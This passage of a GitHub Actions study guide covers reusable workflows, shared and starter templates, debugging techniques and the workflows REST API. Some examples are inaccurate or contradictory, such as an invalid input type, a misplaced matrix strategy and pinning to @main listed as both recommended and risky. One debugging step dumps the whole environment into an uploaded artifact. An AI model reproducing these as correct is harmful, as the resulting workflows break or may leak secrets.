      image-name:
        required: true
        type: string
      dockerfile-path:
        required: false
        type: string
        default: "./Dockerfile"
      build-context:
        required: false
        type: string
        default: "."
      docker-tags:
        required: false
        type: string
        default: "latest"
    secrets:
      registry-username:
        required: true
      registry-password:
        required: true

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v2

      - name: Login to Registry
        uses: docker/login-action@v2
        with:
          username: ${{ secrets.registry-username }}
          password: ${{ secrets.registry-password }}

      - name: Build and Push
        uses: docker/build-push-action@v4
        with:
          context: ${{ inputs.build-context }}
          file: ${{ inputs.dockerfile-path }}
          push: true
          tags: |
            ${{ inputs.image-name }}:${{ inputs.docker-tags }}
```

**Using the reusable workflow:**

```yaml
jobs:
  docker:
    uses: org/shared-workflows/.github/workflows/docker-build.yml@v1
    with:
      image-name: myregistry.azurecr.io/myapp
      dockerfile-path: "./docker/Dockerfile"
      docker-tags: |
        latest
        ${{ github.sha }}
    secrets:
      registry-username: ${{ secrets.REGISTRY_USERNAME }}
      registry-password: ${{ secrets.REGISTRY_PASSWORD }}
```

#### Code Quality Check (Reusable)

```yaml
# org/shared-workflows/.github/workflows/quality-checks.yml
name: Quality Checks

on:
  workflow_call:
    inputs:
      language:
        required: true
        type: string # javascript, python, java, etc.
      lint-command:
        required: true
        type: string
      build-command:
        required: false
        type: string

jobs:
  quality:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v2
        with:
          languages: ${{ inputs.language }}

      - name: Lint Code
        run: ${{ inputs.lint-command }}

      - name: Build (if specified)
        if: inputs.build-command != ''
        run: ${{ inputs.build-command }}

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v2
```

### 3. **Calling Reusable Workflows from Other Workflows**

```yaml
# Complete CI/CD using multiple reusable workflows
name: Full CI/CD

on: push

jobs:
  quality:
    uses: org/shared-workflows/.github/workflows/quality-checks.yml@main
    with:
      language: javascript
      lint-command: npm run lint
      build-command: npm run build

  test:
    needs: quality
    uses: org/shared-workflows/.github/workflows/shared-tests.yml@main
    with:
      node-version: "18"

  docker:
    needs: test
    uses: org/shared-workflows/.github/workflows/docker-build.yml@v1
    with:
      image-name: myregistry.azurecr.io/myapp
      docker-tags: ${{ github.sha }}
    secrets:
      registry-username: ${{ secrets.REGISTRY_USERNAME }}
      registry-password: ${{ secrets.REGISTRY_PASSWORD }}
```

### 4. **Creating Shared Actions**

#### Composite Action Example

```yaml
# org/shared-actions/deploy-to-azure/action.yml
name: Deploy to Azure
description: Deploy application to Azure App Service

inputs:
  resource-group:
    description: Azure resource group name
    required: true
  app-name:
    description: Azure App Service name
    required: true
  subscription-id:
    description: Azure subscription ID
    required: true
  azure-credentials:
    description: Azure credentials JSON
    required: true

runs:
  using: composite
  steps:
    - name: Azure Login
      uses: azure/login@v1
      with:
        creds: ${{ inputs.azure-credentials }}

    - name: Deploy to App Service
      uses: azure/webapps-deploy@v2
      with:
        app-name: ${{ inputs.app-name }}
        package: "."
        resource-group: ${{ inputs.resource-group }}

    - name: Logout from Azure
      run: az logout
      shell: bash
```

**Using the shared action:**

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Build Application
        run: npm run build

      - name: Deploy
        uses: org/shared-actions/deploy-to-azure@v1
        with:
          resource-group: prod-rg
          app-name: my-app-prod
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
          azure-credentials: ${{ secrets.AZURE_CREDENTIALS }}
```

### 5. **Best Practices for Workflow Sharing**

#### ✓ Recommended Practices — Workflow Sharing

```yaml
# ✓ Version your reusable workflows
uses: org/shared-workflows/.github/workflows/build.yml@v1.0.0
uses: org/shared-workflows/.github/workflows/build.yml@main  # or main branch

# ✓ Document inputs and secrets clearly
on:
  workflow_call:
    inputs:
      environment:
        description: 'Deployment environment (dev, staging, prod)'
        required: true
        type: choice
        default: dev
    secrets:
      api-key:
        description: 'API key for service authentication'
        required: true

# ✓ Use descriptive workflow file names
test.yml
test-nodejs.yml
test-python.yml

# ✓ Include usage documentation
# README.md in shared-workflows repository with examples
```

#### ✗ Anti-Patterns to Avoid — Workflow Sharing

```yaml
# ✗ Don't use workflows from untrusted sources
uses: random-org/workflows/.github/workflows/build.yml@main

# ✗ Don't expose secrets unnecessarily
outputs:  # Don't output secrets!
  api-key: ${{ secrets.API_KEY }}

# ✗ Don't make workflows overly rigid
# Allow customization via inputs

# ✗ Don't use latest without pinning versions
uses: org/workflows/.github/workflows/build.yml@main  # Risky!
uses: org/workflows/.github/workflows/build.yml@v1    # Better
```

---

### 6. **Starter Workflows**

Starter workflows are template workflows stored in a repository's `.github/workflows/` or in the org-level `.github` repository under `workflow-templates/`. When a user **creates a new workflow** in a repository, GitHub offers these templates in the Actions tab.

**Key characteristic:** Starter workflows are **copied** into the consuming repository and become independent. They are not linked back — changes to the template do not propagate.

| Feature                  | Starter Workflow              | Reusable Workflow               | Composite Action                |
| ------------------------ | ----------------------------- | ------------------------------- | ------------------------------- |
| How invoked              | Copied on creation (one-time) | `uses:` at runtime              | `uses:` at runtime              |
| Stays linked to source?  | ❌ No — independent copy      | ✅ Yes — always runs latest ref | ✅ Yes — always runs pinned ref |
| Versioned?               | No — snapshot at copy time    | Yes — via `@ref`                | Yes — via `@ref`                |
| Best for                 | Scaffolding new workflows     | Sharing execution logic         | Encapsulating step logic        |
| Customizable after copy? | ✅ Yes — full control         | ⚠️ Via inputs only              | ⚠️ Via inputs only              |

#### Creating an Organization Starter Workflow

Store the template file in `{org}/.github/workflow-templates/my-template.yml` and a corresponding metadata file `my-template.properties.json`:

```json
// workflow-templates/python-ci.properties.json
{
  "name": "Python CI",
  "description": "Lint and test Python packages",
  "iconName": "octicon python",
  "categories": ["Python", "CI"]
}
```

```yaml
# workflow-templates/python-ci.yml
name: Python CI

on:
  push:
    branches: [$default-branch] # placeholder replaced on copy
  pull_request:
    branches: [$default-branch]

jobs:
  lint-and-test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.x"
      - run: pip install ruff pytest
      - run: ruff check .
      - run: pytest
```

> For **public** repositories, starter workflows are visible to all GitHub users. For organization repositories, they are visible only to members with repository access.

#### Template Placeholder Variables

Starter workflow files support a small set of placeholder variables that GitHub replaces automatically when a user copies the template into their repository:

| Placeholder       | Replaced With                                                  |
| ----------------- | -------------------------------------------------------------- |
| `$default-branch` | The repository's default branch name (e.g. `main` or `master`) |

> **Note:** `$default-branch` is the only officially supported placeholder in workflow template YAML files. Additional metadata lives in the companion `.properties.json` file (fields: `name`, `description`, `iconName`, `categories`) and is not substituted into the YAML.

#### Organizational Workflow Templates vs GitHub-Provided Starter Workflows

**GitHub-Provided Starter Workflows** (on Marketplace):

- **Location**: Managed by GitHub, accessible from any repository's Actions tab
- **Visibility**: Public marketplace visible to all users
- **Best for**: Language/framework-specific scaffolding (Node.js, Python, Go, Rails, etc.)
- **Ownership**: Maintained by GitHub's community

**Organizational Workflow Templates** (private to your org):

- **Location**: Stored in `{org}/.github` repo under `workflow-templates/`
- **Visibility**: Private to organization members with access to `.github` repo
- **Best for**: Organization-specific standards, security policies, internal tooling
- **Ownership**: Your organization maintains

**Creating Private Org Templates - Complete Setup:**

1. **Create or update the `.github` repository** in your organization
2. **Add template files** in `.github/workflow-templates/`:

   ```plaintext
   .github/
   └── workflow-templates/
       ├── security-scan.properties.json
       ├── security-scan.yml
       ├── deploy-prod.properties.json
       └── deploy-prod.yml
   ```

   - **Template metadata** (`security-scan.properties.json`):

   ```json
   {
     "name": "Security Scanning Pipeline",
     "description": "Run CodeQL and SAST for all branches",
     "iconName": "octicon shield",
     "categories": ["Security", "CI"],
     "filePatterns": []
   }
   ```

   - **Template workflow with organization placeholders** (`security-scan.yml`):

   ```yaml
   name: Security Scanning

   on:
     push:
       branches: [$default-branch]
     pull_request:
       branches: [$default-branch]

   env:
     # Organization-wide defaults
     REGISTRY: ghcr.io
     IMAGE_NAME: ${{ github.repository }}

   jobs:
     security-scan:
       runs-on: ubuntu-latest
       permissions:
         # Org-standard permissions
         security-events: write
         contents: read
       steps:
         - uses: actions/checkout@v4

         - name: Initialize CodeQL
           uses: github/codeql-action/init@v2
           with:
             languages: javascript # Customize per repo on copy

         - name: Perform CodeQL Analysis
           uses: github/codeql-action/analyze@v2

         - name: Upload SARIF results
           uses: github/codeql-action/upload-sarif@v2
           with:
             sarif-file: results.sarif
   ```

**Discovering and Using Org Templates:**

1. In any organization repository, navigate to Actions → **"New workflow"**
2. Look for your **organization's templates** section (before GitHub's marketplace templates)
3. Click on a template to create a copy
4. The template is copied into `.github/workflows/` of that repository (fully independent)
5. Customize as needed

#### Access and Permission Model for Non-Public Org Templates

Understanding who can see and use non-public (private/internal) org workflow templates is important for governance.

**Visibility of the `.github` repository:**

| `.github` repo visibility                | Who sees org templates in "New workflow" UI                          |
| ---------------------------------------- | -------------------------------------------------------------------- |
| **Public**                               | All GitHub users (not just org members)                              |
| **Private**                              | Only org members with at least **Read** access to the `.github` repo |
| **Internal** _(GitHub Enterprise Cloud)_ | All members of the enterprise (across orgs)                          |

**Key rules:**

- The `.github` repository controls access to all templates stored inside it
- By default, organization members have **Read** access to repos in the org if the org's base permission is `Read` or higher — this applies to `.github` as well
- If the `.github` repo is **private** and a member has no explicit access, they will **not see the org's templates** in the new-workflow UI
- Owners and admins can restrict the base permission of the org to `None`, which means the `.github` repo must have explicit collaborator or team access granted for members to see the templates

**Granting access to non-public templates:**

```text
Organization Settings → Member privileges → Base permissions
  └─ Set to "Read" so all members can see the .github repo templates

  OR (more granular):

Organization Settings → Teams → [team-name] → Repositories
  └─ Add the .github repo with Read access for that team only
```

**Repository-level permission requirements to copy a template:**

A user can discover and **initiate** a template copy if they can see the `.github` repo. To actually save the copied workflow file, they need **Write** (or higher) access to the **target repository** where they are creating the new workflow — standard repository write permission applies.

**Enterprise considerations:**

On **GitHub Enterprise Cloud**, setting the `.github` repo visibility to **Internal** is the recommended approach for org-wide templates that all enterprise members should access without making them fully public:

```text
.github repo visibility: Internal
→ Visible to all enterprise members regardless of org membership
→ Not visible to external collaborators or the public
→ Templates appear in "New workflow" for any enterprise repo
```

On **GitHub Enterprise Server**, the same internal visibility model applies within the server instance.

**Restricting which repos can use certain templates (workaround):**

GitHub does not natively restrict which target repos can copy a specific template (all or nothing per `.github` repo visibility). For fine-grained control, split templates across separate template repositories and apply access controls per repository. A common pattern:

```text
{org}/.github                    → public templates (base scaffold)
{org}/.github-internal           → internal/compliance templates (restricted team access)
{org}/.github-security           → security team templates (security team only)
```

> **Note:** Only the special `.github` repository name triggers the "workflow templates" feature. Alternative repositories (`-internal`, `-security` etc.) will not show their templates in the new-workflow UI — they must be accessed and copied manually.

**Sync Pattern for Org Templates** (if you want changes to propagate):

Since templates are copied, they don't auto-update. If you need central control, use reusable workflows instead:

```yaml
# Option A: Use reusable workflow (stays linked)
name: Call Our Security Workflow

on:
  push:

jobs:
  security:
    uses: {org}/.github/.github/workflows/security-reusable.yml@main
```

#### Disabling vs Deleting a Workflow

| Action      | Effect                                                                                       | When to use                                            |
| ----------- | -------------------------------------------------------------------------------------------- | ------------------------------------------------------ |
| **Disable** | Workflow is paused; no new runs trigger. History and logs preserved. Re-enable at any time.  | Temporarily halt a workflow (e.g., during maintenance) |
| **Delete**  | Workflow file is removed from the repository. All run history is also deleted after 90 days. | Permanently remove an obsolete workflow                |

**Disable via UI:** Actions tab → click the workflow → ⋯ menu → **Disable workflow**

**Disable via REST API:**

```bash
# Disable a workflow
curl -X PUT \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/OWNER/REPO/actions/workflows/WORKFLOW_ID/disable

# Re-enable a workflow
curl -X PUT \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  https://api.github.com/repos/OWNER/REPO/actions/workflows/WORKFLOW_ID/enable
```

---

### 7. **Workflow Status Badges**

Embed a live status badge in your README or other Markdown files to show whether the latest run of a workflow passed or failed.

**Badge URL format:**

```text
https://github.com/{OWNER}/{REPO}/actions/workflows/{WORKFLOW_FILE}/badge.svg
```

**Branch-specific badge** (defaults to the default branch):

```text
https://github.com/{OWNER}/{REPO}/actions/workflows/{WORKFLOW_FILE}/badge.svg?branch=main
```

**Markdown embed:**

```markdown
[![CI](https://github.com/myorg/myrepo/actions/workflows/ci.yml/badge.svg)](https://github.com/myorg/myrepo/actions/workflows/ci.yml)

<!-- Branch-specific badge -->

[![Build Status](https://github.com/myorg/myrepo/actions/workflows/build.yml/badge.svg?branch=release)](https://github.com/myorg/myrepo/actions/workflows/build.yml?query=branch%3Arelease)
```

**Badge states:** `passing`, `failing`, `no status` (no runs yet), `cancelled`, `skipped`

---

## Workflow Debugging

### What is Workflow Debugging

Workflow debugging is the process of identifying and fixing issues in GitHub Actions workflows. It involves understanding why workflows fail, examining logs, adding diagnostic output, and validating configurations. Debugging techniques range from simple log inspection to advanced tracing and performance analysis.

### Why Debug Workflows

**Key Reasons:**

1. **Failure Resolution**: Quickly identify and fix workflow failures
2. **Performance Optimization**: Identify slow steps and bottlenecks
3. **Cost Reduction**: Optimize resource usage and execution time
4. **Reliability**: Ensure workflows run consistently
5. **Learning**: Understand workflow behavior and best practices
6. **Prevention**: Catch issues before they reach production

### How Debugging Works

**Debugging Workflow:**

1. **Identify**: Recognize workflow has failed or behaves unexpectedly
2. **Inspect**: Review workflow logs and error messages
3. **Analyze**: Determine root cause using available information
4. **Test**: Add diagnostic steps to gather more information
5. **Fix**: Apply solution based on findings
6. **Verify**: Confirm workflow works as expected

### 1. **Understanding Workflow Logs**

#### Accessing Workflow Logs

**Via GitHub Web UI:**

```text
1. Navigate to Repository → Actions tab
2. Click on specific workflow run
3. View logs for each job and step
4. Click on individual steps to expand logs
```

**Log Levels:**

```text
[INFO] Standard information messages
[WARNING] Potential issues
[ERROR] Error conditions
[DEBUG] Detailed diagnostic information (when enabled)
```

#### Environment Information in Logs

```yaml
jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - name: Print Environment
        run: |
          echo "=== GitHub Context ==="
          echo "Event: $GITHUB_EVENT_NAME"
          echo "Repository: $GITHUB_REPOSITORY"
          echo "Branch: $GITHUB_REF_NAME"
          echo "Actor: $GITHUB_ACTOR"
          echo "Workspace: $GITHUB_WORKSPACE"

          echo ""
          echo "=== Runner Info ==="
          echo "OS: $RUNNER_OS"
          echo "Arch: $RUNNER_ARCH"
          uname -a

          echo ""
          echo "=== Disk Space ==="
          df -h
```

### 2. **Enabling Debug Logging**

#### RUNNER_DEBUG Variable

**Enable in Workflow:**

```yaml
- name: Run with Debug
  env:
    RUNNER_DEBUG: true
  run: npm test
```

**Enable via Secrets:**

1. Go to `Settings → Secrets → Actions`
2. Create secret: `ACTIONS_STEP_DEBUG: true`
3. Re-run workflow - all steps produce verbose output

#### Output with RUNNER_DEBUG

```bash
# Without RUNNER_DEBUG:
/usr/bin/npm test
Test Results: PASS

# With RUNNER_DEBUG:
::debug::Preparing command: npm test
::debug::PWD: /home/runner/work/repo/repo
::debug::PATH: /usr/local/sbin:/usr/local/bin:...
::debug::Arguments: ['test']
::debug::Exit code: 0
/usr/bin/npm test
Test Results: PASS
```

### 3. **Using Workflow Commands**

#### Add Diagnostic Markers

```yaml
- name: Step with Diagnostics
  run: |
    echo "::debug::Starting build process"
    npm run build
    echo "::notice::Build completed successfully"
    echo "::warning::Deprecated feature used in code"
    echo "::error::Critical issue found"
```

#### Output Variables for Debugging

```yaml
- name: Capture Build Output
  id: build
  run: |
    echo "::debug::Running build..."
    BUILD_OUTPUT=$(npm run build 2>&1)
    echo "output=$BUILD_OUTPUT" >> $GITHUB_OUTPUT
    echo "::debug::Build output: $BUILD_OUTPUT"

- name: Check Build Output
  run: echo "Build: ${{ steps.build.outputs.output }}"
```

#### Grouping Output

```yaml
- name: Complex Step
  run: |
    echo "::group::Build Process"
    echo "Starting build..."
    npm run build
    echo "Build complete"
    echo "::endgroup::"

    echo "::group::Test Process"
    npm test
    echo "::endgroup::"
```

### 4. **Common Debugging Scenarios**

#### Scenario 1: Authentication Failures

```yaml
jobs:
  debug-auth:
    runs-on: ubuntu-latest
    steps:
      - name: Debug GitHub Token
        run: |
          # Check if token is present
          if [ -z "$GITHUB_TOKEN" ]; then
            echo "::error::GITHUB_TOKEN not set"
            exit 1
          fi

          # Check token permissions
          echo "::debug::Checking GitHub token permissions"
          curl -H "Authorization: token $GITHUB_TOKEN" \
               https://api.github.com/user \
               -o /dev/null -w "HTTP Status: %{http_code}\n"

          if [ $? -ne 0 ]; then
            echo "::error::Token authentication failed"
            exit 1
          fi
          echo "::notice::Token authentication successful"
```

#### Scenario 2: Dependency Issues

```yaml
jobs:
  debug-deps:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Debug Dependencies
        run: |
          echo "::group::Dependency Information"

          echo "Node version:"
          node --version

          echo "\nNPM version:"
          npm --version

          echo "\nChecking package-lock.json:"
          if [ -f package-lock.json ]; then
            echo "package-lock.json exists"
            echo "Hash: $(md5sum package-lock.json)"
          else
            echo "::warning::package-lock.json not found"
          fi

          echo "\nDisk space available:"
          df -h | grep -E '^/dev/|Available'

          echo "::endgroup::"

      - name: Install with Verbose Output
        run: npm ci --verbose
```

#### Scenario 3: Timeout Issues

```yaml
jobs:
  debug-timeout:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v3

      - name: Check Start Time
        id: start
        run: echo "time=$(date +%s)" >> $GITHUB_OUTPUT

      - name: Long Running Task
        run: |
          echo "::debug::Task started at ${{ steps.start.outputs.time }}"
          ./long-task.sh
          echo "::debug::Task completed at $(date +%s)"

      - name: Check Elapsed Time
        if: always()
        run: |
          START=${{ steps.start.outputs.time }}
          END=$(date +%s)
          ELAPSED=$((END - START))
          echo "::notice::Elapsed time: ${ELAPSED}s"

          if [ $ELAPSED -gt 540 ]; then
            echo "::warning::Task approaching timeout (9 minutes)"
          fi
```

#### Scenario 4: Matrix Selective Reruns

When a matrix job fails, you may want to rerun only the specific failing combinations instead of all matrix jobs.

**Understanding Matrix Job Names:**

Matrix jobs are labelled by their axes combination. For a matrix with `os: [ubuntu, windows]` and `node: [18, 20]`:

```yaml
strategy:
  matrix:
    os: [ubuntu-latest, windows-latest]
    node: [18, 20]

jobs:
  test:
    runs-on: ${{ matrix.os }}
    steps:
      - run: npm test
```

Generated job names will be:

- `test (ubuntu-latest, 18)`
- `test (ubuntu-latest, 20)`
- `test (windows-latest, 18)`
- `test (windows-latest, 20)`

**Selective Rerun via UI:**

```text
1. Go to "Actions" tab
2. Click workflow run that had failures
3. Under "Jobs" section, each matrix combination is listed separately
4. Click "Re-run jobs" → "Re-run failed jobs" only reruns failed combinations
5. Or click "..." on specific job → "Re-run job [combination]"
```

**Selective Rerun via GitHub CLI:**

```bash
# Get workflow run ID
gh run list --workflow=test.yml --limit=5

# Rerun only failed jobs (of the entire matrix)
gh run rerun RUNID --failed

# Rerun a specific job (need job ID from workflow)
gh run rerun RUNID --job JOBID
```

**Matrix Selective Rerun Example Workflow:**

```yaml
name: Multi-Platform Tests

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  test:
    name: test (${{ matrix.os }}, Node ${{ matrix.node }})
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false # Let all matrix jobs run even if one fails
      matrix:
        os: [ubuntu-latest, windows-latest, macos-latest]
        node: [18, 20, 21]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node }}

      - name: Run Tests
        run: npm test

      - name: Generate Report
        if: failure()
        run: |
          echo "Test failed on ${{ matrix.os }} with Node ${{ matrix.node }}"
          # Save failure details for reference
          echo "OS: ${{ matrix.os }}" >> test-report.txt
          echo "Node: ${{ matrix.node }}" >> test-report.txt

      - name: Upload Test Report
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: test-report-${{ matrix.os }}-node${{ matrix.node }}
          path: test-report.txt
```

**REST API for Selective Rerun:**

```bash
# Rerun all failed jobs in a workflow run
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/runs/RUNID/rerun-failed-jobs

# Get all jobs in a workflow run (to find job IDs)
curl -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/runs/RUNID/jobs \
  | jq '.jobs[] | {id, name, status, conclusion}'

# Rerun a specific job
curl -X POST \
  -H "Authorization: Bearer $TOKEN" \
  https://api.github.com/repos/OWNER/REPO/actions/jobs/JOBID/rerun
```

**Best Practices for Matrix Debugging:**

1. **Use descriptive job names** - Include matrix values in the job name for clarity
2. **Set `fail-fast: false`** - Let all combinations run to see all failures at once
3. **Use artifacts for debug info** - Upload logs specific to each matrix combination
4. **Group output** - Use `::group::` to organize per-combination logs
5. **Conditional debugging steps** - Add debug steps only when tests fail

```yaml
jobs:
  test:
    name: test (${{ matrix.os }}, ${{ matrix.node }})
    runs-on: ${{ matrix.os }}
    strategy:
      fail-fast: false
      matrix:
        os: [ubuntu-latest, windows-latest]
        node: [18, 20]
    steps:
      - run: npm test

      - name: Debug Info (on failure)
        if: failure()
        run: |
          echo "::group::Failure Details"
          echo "Platform: ${{ matrix.os }}"
          echo "Node Version: ${{ matrix.node }}"
          npm --version
          npm ls
          echo "::endgroup::"
```

### 5. **Performance and Profiling**

#### Identify Slow Steps

```yaml
name: Performance Profiling

on: push

jobs:
  profile:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Profile Step Times
        run: |
          #!/bin/bash
          declare -A times

          echo "::group::Performance Metrics"

          # Step 1: Setup
          START=$(date +%s%N)
          npm install
          END=$(date +%s%N)
          TIME=$(( ($END - $START) / 1000000 ))
          echo "Setup time: ${TIME}ms"
          times[setup]=$TIME

          # Step 2: Build
          START=$(date +%s%N)
          npm run build
          END=$(date +%s%N)
          TIME=$(( ($END - $START) / 1000000 ))
          echo "Build time: ${TIME}ms"
          times[build]=$TIME

          # Step 3: Test
          START=$(date +%s%N)
          npm test
          END=$(date +%s%N)
          TIME=$(( ($END - $START) / 1000000 ))
          echo "Test time: ${TIME}ms"
          times[test]=$TIME

          # Find slowest step
          slowest_key=$(for k in "${!times[@]}"; do echo "$k:${times[$k]}"; done | sort -t: -k2 -nr | head -1 | cut -d: -f1)
          echo "::notice::Slowest step: $slowest_key (${times[$slowest_key]}ms)"

          echo "::endgroup::"
```

#### Cache Hit Analysis

```yaml
- uses: actions/cache@v3
  id: cache
  with:
    path: node_modules
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}

- name: Analyze Cache Performance
  run: |
    echo "::group::Cache Analysis"
    CACHE_HIT="${{ steps.cache.outputs.cache-hit }}"

    if [ "$CACHE_HIT" = "true" ]; then
      echo "✓ Cache hit - dependencies restored"
    else
      echo "✗ Cache miss - fresh dependencies installed"
      echo "::warning::Consider checking if lock file changed unexpectedly"
    fi

    echo "Node modules size:"
    du -sh node_modules

    echo "::endgroup::"
```

### 6. **Debugging Common Failures**

#### File Not Found Error

```yaml
- name: Debug File Issue
  run: |
    echo "::group::File Debugging"

    TARGET_FILE="dist/index.js"

    if [ ! -f "$TARGET_FILE" ]; then
      echo "::error::File not found: $TARGET_FILE"

      echo "Current directory: $(pwd)"
      echo "Directory contents:"
      ls -la

      echo "\nSearching for index.js:"
      find . -name "index.js" -type f

      exit 1
    fi

    echo "✓ File found: $TARGET_FILE"
    echo "::endgroup::"
```

#### Environment Variable Issues

```yaml
- name: Debug Environment Variables
  run: |
    echo "::group::Environment Variables"

    # Check if expected variables exist
    REQUIRED_VARS=("DATABASE_URL" "API_KEY" "ENVIRONMENT")

    for var in "${REQUIRED_VARS[@]}"; do
      if [ -z "${!var}" ]; then
        echo "::error::Required variable not set: $var"
      else
        echo "✓ $var is set"
      fi
    done

    echo "All available workflow variables:"
    compgen -e | sort

    echo "::endgroup::"
```

### 7. **Best Practices for Debugging**

#### ✓ Recommended Practices — Debugging

```yaml
# ✓ Add strategic debug output at key points
- run: |
    echo "::debug::Starting build process"
    npm run build
    echo "::debug::Build completed"

# ✓ Capture and analyze logs
- run: npm test 2>&1 | tee test-output.log
- uses: actions/upload-artifact@v3
  if: always()
  with:
    name: test-logs
    path: test-output.log

# ✓ Use meaningful error messages
- run: |
    if [ ! -f config.json ]; then
      echo "::error::config.json required but not found"
      exit 1
    fi

# ✓ Group related debugging information
- run: |
    echo "::group::System Information"
    uname -a
    df -h
    echo "::endgroup::"

# ✓ Enable debugging only when needed
- name: Run with Debug (if triggered)
  env:
    RUNNER_DEBUG: ${{ secrets.ACTIONS_STEP_DEBUG }}
  run: npm test
```

#### ✗ Anti-Patterns to Avoid — Runner Debugging

```yaml
# ✗ Don't expose secrets in debug output
- run: echo "::debug::API Key: ${{ secrets.API_KEY }}"  # NEVER!

# ✗ Don't leave debug logging on permanently
# (Wastes resources and clutters logs)
- run: |
    set -x  # Debug mode - only for troubleshooting
    npm test
    set +x

# ✗ Don't ignore failed steps
- run: npm test || true  # BAD - hides failures

# ✗ Don't use hardcoded test paths
- run: /home/runner/work/specific-repo/specific-repo/test.sh  # Not portable!
```

### 8. **Advanced Debugging Techniques**

#### Real-time Log Streaming

```yaml
- name: Stream Logs in Real-time
  run: |
    (
      npm test
    ) 2>&1 | while IFS= read -r line; do
      echo "[$(date +'%Y-%m-%d %H:%M:%S')] $line"
    done
```

#### Conditional Debugging

```yaml
- name: Run with Conditional Debug
  run: |
    if [[ "${{ github.event_name }}" == "pull_request" ]]; then
      echo "::debug::PR detected - enabling verbose mode"
      DEBUG_FLAGS="--verbose"
    else
      DEBUG_FLAGS=""
    fi

    npm test $DEBUG_FLAGS
```

#### Artifact Collection for Analysis

```yaml
- name: Collect Debug Artifacts
  if: always()
  run: |
    mkdir -p debug-artifacts

    # Collect logs
    cp /var/log/syslog debug-artifacts/ || true

    # Collect build outputs
    cp -r build debug-artifacts/ || true

    # Collect test results
    cp -r coverage debug-artifacts/ || true

    # Collect environment info
    env > debug-artifacts/environment.txt

    # Create archive
    tar -czf debug-artifacts.tar.gz debug-artifacts/

- uses: actions/upload-artifact@v3
  if: always()
  with:
    name: debug-artifacts
    path: debug-artifacts.tar.gz
```

---

## GitHub Workflows REST API

### What is the GitHub Workflows REST API

The GitHub Workflows REST API is a set of HTTP endpoints provided by GitHub that allow you to programmatically interact with GitHub Actions workflows. Instead of manually triggering workflows or managing them through the web UI, you can use the REST API to automate workflow management from external systems, scripts, or applications.

### Why Use the Workflows REST API

**Key Benefits:**

1. **Automation**: Programmatically trigger and manage workflows without UI interaction
2. **Integration**: Connect external systems (deployment tools, monitoring systems, etc.) with GitHub Actions
3. **Monitoring**: Retrieve workflow execution data for tracking, reporting, and analytics
4. **Control**: Dynamically manage workflow instances (list, view, cancel, re-run)
5. **Developer Experience**: Create custom tooling and dashboards around workflows
6. **Compliance**: Query workflow history for audit and compliance purposes
7. **CI/CD Enhancement**: Build sophisticated automation chains across platforms

**Real-World Applications:**

```text
Scenario 1: Trigger deployment on external event
- External monitoring system detects issue
- Calls GitHub API to trigger deployment workflow
- Automatically starts incident response

Scenario 2: Monitor workflow execution
- Dashboard queries workflow runs
- Displays status across multiple repositories
- Alerts team on failures

Scenario 3: Automated workflow management
- Cleanup script removes old workflow runs
- Analyzes execution times for performance optimization
- Manages workflow artifacts
```

### How the REST API Works

**Authentication:**

All API requests require authentication using:

- Personal Access Token (PAT)
- GitHub App Token
- OAuth token

**Base URL:**

```text
https://api.github.com
```

**Endpoint Format:**

```text
GET /repos/{owner}/{repo}/actions/workflows
GET /repos/{owner}/{repo}/actions/runs
GET /repos/{owner}/{repo}/actions/runs/{run_id}
POST /repos/{owner}/{repo}/actions/workflows/{workflow_id}/dispatches
```

### 1. **List Workflows**

**Endpoint**: `GET /repos/{owner}/{repo}/actions/workflows`

**What it does**: Returns all workflows in a repository

**Basic Example**:

```bash
curl -H "Authorization: token YOUR_TOKEN" \
  https://api.github.com/repos/octocat/Hello-World/actions/workflows
```

**With Filters**:

```bash
curl -H "Authorization: token YOUR_TOKEN" \
  "https://api.github.com/repos/octocat/Hello-World/actions/workflows?per_page=10&page=1"
```

**Response Example**:

```json
{
  "total_count": 2,
  "workflows": [
    {
      "id": 123456,
      "node_id": "MDg6V29ya2Zsb3cxMjM0NTY=",
      "name": "CI",
      "path": ".github/workflows/ci.yml",
      "state": "active",
      "created_at": "2024-01-15T10:30:00Z",
      "updated_at": "2024-03-09T14:20:00Z",
      "url": "https://api.github.com/repos/octocat/Hello-World/actions/workflows/123456",
      "html_url": "https://github.com/octocat/Hello-World/blob/main/.github/workflows/ci.yml",
      "badges_url": "https://github.com/octocat/Hello-World/workflows/CI/badge.svg"
    }
  ]
}
```

#### Using in a Script

```bash
#!/bin/bash

REPO_OWNER="octocat"
REPO_NAME="Hello-World"
GITHUB_TOKEN="your_token_here"

# Get all workflows
WORKFLOWS=$(curl -s -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/$REPO_OWNER/$REPO_NAME/actions/workflows")

# Parse and display
echo "$WORKFLOWS" | jq '.workflows[] | {id, name, state, path}'

# Output:
# {
#   "id": 123456,
#   "name": "CI",
#   "state": "active",
#   "path": ".github/workflows/ci.yml"
# }
```

### 2. **Get Workflow Details**

**Endpoint**: `GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}`

**What it does**: Retrieve detailed information about a specific workflow

